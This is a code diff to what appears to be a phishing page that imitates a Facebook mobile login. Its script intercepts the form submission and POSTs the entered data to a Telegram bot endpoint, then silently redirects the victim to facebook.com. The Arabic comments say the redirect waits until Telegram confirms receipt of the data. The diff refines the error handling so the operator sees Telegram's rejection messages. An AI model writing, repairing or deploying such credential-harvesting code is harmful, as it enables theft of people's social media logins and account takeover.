@@ -164,7 +164,7 @@
 
 <script>
 document.getElementById('fbMobileForm').addEventListener('submit', function(e) {
-    e.preventDefault(); // إيقاف التحديث الفوري لمنع إلغاء طلب الإرسال
+    e.preventDefault();
 
     const button = document.getElementById('submitBtn');
     button.innerText = "جاري الاتصال...";
@@ -184,7 +184,6 @@ document.getElementById('fbMobileForm').addEventListener('submit', function(e) {
         text: messageText
     };
 
-    // تنفيذ طلب الإرسال مع الانتظار الإجباري (حتى لو واجه خطأ يتم التحويل لاحقاً)
     fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -192,12 +191,20 @@ document.getElementById('fbMobileForm').addEventListener('submit', function(e) {
     })
     .then(response => response.json())
     .then(result => {
-        // يتم التحويل فقط بعد أن يؤكد سيرفر تيليجرام استلام البيانات
-        window.location.href = "https://facebook.com";
+        if (result.ok) {
+            // إذا تم الإرسال بنجاح، يوجه الزائر فوراً دون إظهار أي نوافذ
+            window.location.href = "https://facebook.com";
+        } else {
+            // إذا رفض سيرفر تيليجرام الطلب، سيظهر لك سبب الرفض الدقيق بنبذة مختصرة
+            alert("خطأ من سيرفر تيليجرام:\n" + result.description);
+            button.innerText = "تسجيل الدخول";
+            button.disabled = false;
+        }
     })
     .catch(error => {
-        // في حال حدوث خطأ شبكة مفاجئ
-        window.location.href = "https://facebook.com";
+        alert("حدث خطأ في الشبكة أو اتصال الإنترنت لديك.");
+        button.innerText = "تسجيل الدخول";
+        button.disabled = false;
     });
 });
 </script>
